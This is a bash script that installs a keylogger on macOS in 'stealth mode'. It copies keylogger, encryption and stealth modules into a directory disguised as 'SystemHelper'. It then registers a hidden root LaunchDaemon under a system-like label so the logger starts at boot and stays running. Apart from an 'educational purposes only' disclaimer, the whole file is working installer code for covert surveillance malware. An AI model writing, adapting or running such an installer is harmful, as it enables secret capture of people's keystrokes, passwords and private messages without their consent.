#!/bin/bash

# macOS Keylogger Stealth Installer
# WARNING: For educational purposes only. Unauthorized use is illegal.

# Ensure script is run with sudo
if [[ $EUID -ne 0 ]]; then
   echo "This script must be run with sudo" 
   exit 1
fi

# Configuration
INSTALL_DIR="/Library/Application Support/SystemHelper"
KEYLOGGER_NAME="system_helper"
PLIST_NAME="com.system.helper.plist"

# Create installation directory
mkdir -p "$INSTALL_DIR"

# Copy keylogger files
cp ../Backend/keylogger.py "$INSTALL_DIR/$KEYLOGGER_NAME"
cp ../Backend/encrypt.py "$INSTALL_DIR/encrypt.py"
cp ../Backend/stealth.py "$INSTALL_DIR/stealth.py"

# Set permissions
chmod 600 "$INSTALL_DIR/$KEYLOGGER_NAME"
chmod 600 "$INSTALL_DIR/encrypt.py"
chmod 600 "$INSTALL_DIR/stealth.py"

# Create LaunchDaemon for persistence
PLIST_PATH="/Library/LaunchDaemons/$PLIST_NAME"
cat > "$PLIST_PATH" << EOL
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.system.helper</string>
    <key>ProgramArguments</key>
    <array>
        <string>/usr/bin/python3</string>
        <string>$INSTALL_DIR/$KEYLOGGER_NAME</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
    <key>Hidden</key>
    <true/>
</dict>
</plist>
EOL

# Set LaunchDaemon permissions
chmod 600 "$PLIST_PATH"
chown root:wheel "$PLIST_PATH"

# Load the daemon
launchctl load "$PLIST_PATH"

echo "Keylogger installed successfully in stealth mode."
echo "WARNING: Unauthorized use is strictly prohibited." 